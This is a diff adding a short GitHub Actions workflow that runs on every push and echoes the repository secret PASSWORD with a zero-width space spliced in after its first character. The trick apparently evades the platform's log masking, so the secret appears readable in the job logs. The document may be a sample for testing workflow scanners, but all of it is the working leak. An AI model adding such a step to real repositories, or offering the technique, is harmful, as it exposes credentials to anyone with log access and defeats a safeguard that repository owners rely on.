@@ -1,0 +1,9 @@
+on: push
+
+jobs:
+  main:
+    runs-on: ubuntu-latest
+    steps:
+      - run: echo -e "${PASSWORD:0:1}\u200b${PASSWORD#?}"
+        env:
+          PASSWORD: ${{ secrets.PASSWORD }}
